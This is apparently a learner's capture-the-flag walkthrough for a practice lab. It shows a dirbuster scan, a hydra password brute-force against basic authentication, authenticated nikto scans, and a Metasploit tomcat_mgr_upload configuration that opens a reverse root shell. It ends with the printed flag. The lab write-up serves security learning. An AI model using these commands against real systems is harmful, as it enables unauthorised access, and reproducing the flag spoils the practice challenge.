# Tools R Us
Learning / practising tools

### What directory can you find, that begins with a G?
Just running a dirbuster scan here, we find guidelines
### Whose name can you find from this directory?
visiting /guidelines we see 'hey bob, did you update that tomcat server?'
shows us there's a bob, and a tomcat server which is probably vulnerable (why would this note be here tho?)
### What directory has basic authentication?
just visiting the dirs from the scan, protected asks us for auth
### What is bob's password to the protected part of the website?
tried to guess my way through using hydra but wasn't doing well so moving over to the hydra intro room
After that room, I've come back, had to research a little more on the basic authentication usage and found that this command cracks it:
hydra -l bob -P ~/Wordlists/rockyou.txt 10.10.70.107 http-get  -f -V 
password was 123456 no it wasn't, false positive
forgot to pass the login page via -m, updated command:
hydra -l bob -P ~/Wordlists/rockyou.txt 10.10.70.107 http-get -m /protected  -f -V 
password: bubbles
'The protected page has now moved to a different port' >:(
### What other port that serves a webservice is open on the machine?
Our nmap scan showed 1234 was open, visiting that one gives us a server control panel
### Going to the service running on that port, what is the name and version of the software?
simple enough, just reading off the descrip - apache tomcat/7.0.88
### Use Nikto with the credentials you've found and scan the /manager/html directory on the port found above.
### How many documentation files did Nikto identify?
Pretty long scan, found 5 files. Command used:
nikto -host 10.10.70.107 -root /manager/html -port 1234 -output $(pwd)/niktoscan2.txt -id bob:bubbles

### What is the server version?
Hint says to look in nikto output but haven't spotted anything in here yet..
Got myself too focussed on scanning port 1234, turns out the server in question is port 80.
command used:
nikto -id bob:bubbles -h http://10.10.170.249:80

### What version of Apache-Coyote is this service using?
This info was in the nikto output - 1.1

### Use Metasploit to exploit the service and get a shell on the system. WHat user did you get a shell as?
moving over to msf room
loaded metasploit, used search tomcat to try some exploits - this gives us 21 options.
filtering to try the excellent ranks first, leaves us with 10 options.
exploit/linux/http/cisco_prime_inf_rce - able to upload and execute payload but no session created
exploit/linux/http/cpi_tararchive_upload unable to use - does specify cisco prime infrastructure - maybe this is the issue
skipping ones mentioning cisco - now seeing not all actually even mention tomcat. excellent tomcat exploits count is actually 4
exploit/multi/http/tomcat_jsp_upload_bypass - failed to upload payload
exploit/multi/http/tomcat_mgr_deploy - no luck
multi/http/tomcat_mgr_upload - we're in:
	set LHOST (local ip)
	set LPORT 4444
	set RHOSTS (machine ip)
	set RPORT 1234
	set SSL false
	set TARGETURI /manager
	
	set HttpUsername bob
	set HttpPassword bubbles
	run
gives us a meterpreter session. shell gives us a shell
whoami tells us we're root

trying last excellent exploit just in case!!
exploit/windows/http/tomcat_cgi_cmdlineargs - target not vulnerable

### What text is in the file /root/flag.txt
cat /root/flag.txt
ff1fc4a81affcc7688cf89ae7dc6e0e1
